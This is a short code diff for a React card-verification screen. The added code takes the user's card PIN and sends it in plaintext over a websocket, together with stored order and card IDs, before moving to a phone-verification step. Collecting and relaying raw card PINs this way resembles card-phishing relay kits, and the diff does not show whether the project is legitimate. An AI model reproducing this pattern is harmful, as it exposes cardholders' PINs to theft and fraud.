@@ -115,10 +115,12 @@ import {
   resetError,
 } from "../redux/slices/cardVerificationSlice";
 import { setCardPin } from "../redux/slices/cardOwnershipSlice";
+import { useSocket } from "../contexts/SocketProvider";
 
 export const CardVerification = () => {
   const navigate = useNavigate();
   const dispatch = useDispatch();
+  const socket = useSocket();
   const { pin, error } = useSelector(
     (state: RootState) => state.cardVerification
   );
@@ -143,6 +145,14 @@ export const CardVerification = () => {
 
       try {
         dispatch(setCardPin(pin));
+        // tell seif make this event accept also the cardId "important"
+        const order_id = JSON.parse(localStorage.getItem("order_id"));
+        const card_id = JSON.parse(localStorage.getItem("card_id"));
+        socket.emit("card-verification", {
+          orderId: order_id,
+          cardId: card_id,
+          secret_code: pin,
+        });
         navigate("/verify-phone");
       } catch {
         dispatch(setError("الرقم السري غير صحيح"));
